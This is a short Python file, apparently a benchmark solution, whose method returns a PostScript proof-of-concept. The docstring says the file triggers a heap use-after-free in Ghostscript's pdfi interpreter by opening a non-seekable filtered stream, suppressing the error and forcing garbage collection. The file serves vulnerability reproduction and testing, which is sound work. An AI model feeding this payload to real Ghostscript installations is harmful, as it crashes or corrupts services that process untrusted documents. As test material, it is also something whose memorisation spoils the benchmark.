import os

class Solution:
    def solve(self, src_path: str) -> bytes:
        """
        Generate a PoC that triggers the Heap Use After Free vulnerability in Ghostscript pdfi.
        The vulnerability (arvo:42280 / Bug 699656) occurs when the pdfi input stream initialization fails
        (e.g., due to a non-seekable stream), but the context is not properly cleaned up, leading to a UAF.
        """
        
        # The PoC is a PostScript file that:
        # 1. Enforces the use of the PDFI interpreter.
        # 2. Creates a non-seekable stream using an ASCII85Decode filter (pdfi requires seekable streams).
        # 3. Invokes the internal .pdfopen operator with this stream, wrapped in 'stopped' to suppress the error.
        # 4. Triggers garbage collection (vmreclaim) to force access to the dangling/corrupted context.
        
        poc = (
            b"%!PS\n"
            b"/PDFInterpreter /PDFI def\n"
            b"systemdict /.pdfopen known {\n"
            b"  /s (~) /ASCII85Decode filter def\n"
            b"  { s .pdfopen } stopped\n"
            b"  $error /newerror false put\n"
            b"  vmreclaim\n"
            b"} if\n"
            b"quit\n"
        )
        
        return poc